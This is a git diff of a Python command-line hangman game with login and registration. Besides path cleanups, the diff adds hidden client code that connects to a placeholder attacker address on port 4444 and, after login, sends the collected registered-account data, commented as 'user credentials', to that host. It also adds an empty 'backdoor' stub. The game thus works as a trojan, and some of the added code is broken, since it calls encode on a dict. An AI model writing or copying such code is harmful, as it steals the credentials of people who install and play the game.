@@ -23,10 +23,10 @@ from datetime import datetime
 
 current_dir = os.getcwd()
 
-with open(f"C:\\Users\\israe\\Documents\\Evil_Tech\\hangman_cli\\words.txt", "r") as file:
+with open(f"{current_dir}\\words.txt", "r") as file:
 	words = file.readlines()
 
-with open(f"C:\\Users\\israe\\Documents\\Evil_Tech\\hangman_cli\\database.json") as f:
+with open(f"{current_dir}\\database.json") as f:
 	contents = json.load(f)
 
 
@@ -45,6 +45,10 @@ swallow_graph = []
 file_name = os.path.basename(__file__)
 game_username = []
 usernames = []
+hangman_username = []
+
+
+registered_account = dict()
 
 ADDR = "<your_ip_address>"
 PORT = 4444
@@ -369,18 +373,19 @@ class Register:
 			for j in i.values(): 
 				temporary.append(j)
 
-		if os.stat("C:\\Users\\israe\\Documents\\Evil_Tech\\hangman_cli\\database.json").st_size == 0:
+		if os.stat(f"{current_dir}\\database.json").st_size == 0:
 				with open("Login/database.json", "w") as f:
 					json.dump(data, f, indent=2)
 				
 		
 		else:
 
-			with open("C:\\Users\\israe\\Documents\\Evil_Tech\\hangman_cli\\database.json", "+r") as files:
+			with open(f"{current_dir}\\database.json", "+r") as files:
 				contents = json.load(files)
 
 				for i in data[users]:
 					databases.update(i)
+					registered_account.update(i)
 
 				contents['database'].append(databases)
 
@@ -405,7 +410,7 @@ class Register:
 					log = Login(username, password)
 					log.loged_in()
 
-					game_username.append(username)
+					hangman_username.append(username)
 
 				except KeyboardInterrupt:
 					print("\nQuiting...")
@@ -423,20 +428,20 @@ class Login:
 
 			
 		info = []
-		with open("C:\\Users\\israe\\Documents\\Evil_Tech\\hangman_cli\\database.json", "r") as file:
+		with open(f"{current_dir}\\database.json", "r") as file:
 				content = json.load(file)
 		
 		for i in content['database']:
 			for x in i.values():
 				info.append(x)
 
-		if self.username in info or self.username in temporary and self.password in info or self.password in temporary:
-			usernames.append(self.username)
+		if self.username in info and self.password in info :
+			hangman_username.append(self.username)
 			print("Logged in sucessfully :)")
 			time.sleep(1)
 
 			try:
-				#play = restart()
+				#restart()
 				threads = Thread(target=restart)
 				threads.start()
 				
@@ -466,12 +471,19 @@ class Login:
 			else: 
 				print("[!] invalid input")
 				sys.exit()
+
+
+
 def handle_users():
 	pass
 
 """---------------------------------Client-------------------------------------------"""
 
 # First the user must login before he gets added to the server.
+def backdoor(conn, addr):
+	pass
+
+
 def client():
 	
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -481,14 +493,6 @@ def client():
 	
 	while connected:
 		
-		msg = client.recv(1024).decode("utf-8")
-		
-		if msg == "client_name":
-			client.send("admin".encode("utf-8"))
-		
-		if msg == "exit":
-			sys.exit()
-
 		print(logo)
 		print("-" * 50)
 		
@@ -498,15 +502,30 @@ def client():
 
 			
 
+			
 			log = Login(username, password)
 			log.loged_in()
 
 			game_username.append(username)
-
+		
 
 		except KeyboardInterrupt:
 			print("\nQuiting...")
 			time.sleep(1)
+
+		msg = client.recv(1024).decode("utf-8")
+		
+		if msg == "client_name":
+			name = hangman_username[0]
+			client.send(f"{name}".encode("utf-8"))
+			#client.send("admin".encode("utf-8"))
+		
+		if msg == "exit":
+			print("[!] closing the connection....")
+			client.close()
+
+		# user credentials
+		client.send(registered_account.encode("utf-8"))
 
 	client.close()
 
